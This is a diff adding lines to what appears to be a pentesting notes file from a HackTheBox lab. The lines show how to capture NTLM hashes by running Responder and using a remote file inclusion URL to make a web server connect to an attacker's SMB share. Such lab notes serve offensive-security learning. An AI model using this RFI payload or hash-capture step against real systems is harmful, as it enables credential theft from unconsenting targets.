@@ -222,6 +222,14 @@ conncet using cert and priv key:
 ## Get NTLM hash
 ![image](https://user-images.githubusercontent.com/19478700/214714186-e3876353-c3fe-4cd1-99e8-789f7135cea5.png)
 ![image](https://user-images.githubusercontent.com/19478700/214714312-f5b2151e-a0a4-4454-b329-a59532432865.png)
+we can also use responder to listen for any attempt to connect to our share to get the hash
+for example in an RFI we can make te web service acces the share by visiting the link :
+http://school.flight.htb/index.php?view=//10.10.16.82/test
+```s
+responder -I tun0 -wPv
+```
+
+
 ## Host share server
 ![image](https://user-images.githubusercontent.com/19478700/214715933-ca7cdb35-89da-4b7b-8a53-f5ce63e1c582.png)
 #### to copy files to share:
